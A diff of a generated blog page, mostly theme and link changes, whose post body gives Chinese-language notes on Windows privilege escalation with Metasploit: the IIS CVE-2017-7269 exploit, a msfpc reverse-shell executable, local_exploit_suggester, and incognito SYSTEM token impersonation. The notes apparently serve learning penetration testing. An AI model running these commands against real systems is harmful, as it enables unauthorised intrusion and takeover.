@@ -102,12 +102,12 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeubcbajj20zk0m8h1h.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipet4bz0yj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipevuctzzj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
         </ul>
       </div>
     </header>
@@ -155,19 +155,19 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <p><strong>Cve-2016-7269 低权限提权</strong></p>
 <p>第一种方法</p>
 <p>利用模块进行渗透</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;iis&#x2F;cve-2017-7269</span><br><span class="line">set rhosts IP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/iis/cve-2017-7269</span><br><span class="line">set rhosts IP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163403824.png" alt="image-20210320163403824"></p>
 <p>发现是 windows 低权限，限免进行提权</p>
 <h3 id="生成exe上传反弹木马"><a class="markdownIt-Anchor" href="#生成exe上传反弹木马">#</a> 生成 exe 上传反弹木马</h3>
 <p>生成反弹木马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfpc windows 本地IP 3333</span><br><span class="line">mv windows-*.exe 1.exe</span><br><span class="line">msfconsole -r windows-*exe.rc</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfpc windows 本地IP 3333</span><br><span class="line">mv windows-*.exe 1.exe</span><br><span class="line">msfconsole -r windows-*exe.rc</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163757983.png" alt="image-20210320172549963"></p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163555815.png" alt="image-20210320163555815"></p>
 <p>上传 1.exe 到 C:/1 / 下，进行反弹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -f 1.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -f 1.exe</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163856952.png" alt="image-20210320163856952"></p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163912440.png" alt="image-20210320163757983"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester 查看可利用模块</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用run post/multi/recon/local_exploit_suggester 查看可利用模块</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320164413649.png" alt="image-20210320165533159"></p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320165555084.png" alt="image-20210320164413649"></p>
 <p>获得 windows 高权限</p>
@@ -175,7 +175,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <h3 id="令牌提权"><a class="markdownIt-Anchor" href="#令牌提权">#</a> 令牌提权</h3>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320171633846.png" alt="image-20210320171633846"></p>
 <p>低权限令牌提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use incognito # 加载窃取令牌模块</span><br><span class="line">list_tokens -u # 查看可用的用户令牌</span><br><span class="line">list_tokens -g # 查看可用的用户组令牌</span><br><span class="line">impersonate_token &#39;NT AUTHORITY\SYSTEM&#39; # 假冒 SYSTEM token</span><br><span class="line">rev2self #返回原始 token</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use incognito # 加载窃取令牌模块</span><br><span class="line">list_tokens -u # 查看可用的用户令牌</span><br><span class="line">list_tokens -g # 查看可用的用户组令牌</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27; # 假冒 SYSTEM token</span><br><span class="line">rev2self #返回原始 token</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320172549963.png" alt="image-20210320165555084"></p>
 
       <div class="tags">
@@ -241,7 +241,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <div class="item left">
       
 
-  <a href="/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipewr8iypj20zk0m8b29.jpg" title="Linux提权">
+  <a href="/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicit31ffoj20zk0m8naf.jpg" title="Linux提权">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>Linux提权</h3>
@@ -251,7 +251,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <div class="item right">
       
 
-  <a href="/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyonbf9j20zk0m8e81.jpg" title="meterpreter学习笔记">
+  <a href="/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhfehz7j20zk0m8u0x.jpg" title="meterpreter学习笔记">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>meterpreter学习笔记</h3>
@@ -359,7 +359,16 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" title="Linux提权">Linux提权</a></span>
+    <span><a href="/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" title="php危险函数">php危险函数</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" title="meterpreter学习笔记">meterpreter学习笔记</a></span>
   </li>
 
       
@@ -377,7 +386,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="upload-labs通关记录">upload-labs通关记录</a></span>
+    <span><a href="/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/" title="溯源取证总结">溯源取证总结</a></span>
   </li>
 
       
@@ -395,34 +404,25 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
+    <span><a href="/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" title="Linux提权">Linux提权</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="upload-labs通关记录">upload-labs通关记录</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
     <span><a href="/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" title="paramiko模块介绍">paramiko模块介绍</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/" title="溯源取证总结">溯源取证总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" title="php危险函数">php危险函数</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" title="meterpreter学习笔记">meterpreter学习笔记</a></span>
   </li>
 
   </ul>
@@ -447,13 +447,13 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">62k 字</span>
+    <span title="站点总字数">60k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">56 分钟</span>
+    <span title="站点阅读时长">55 分钟</span>
   </div>
   <div class="powered-by">
     基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
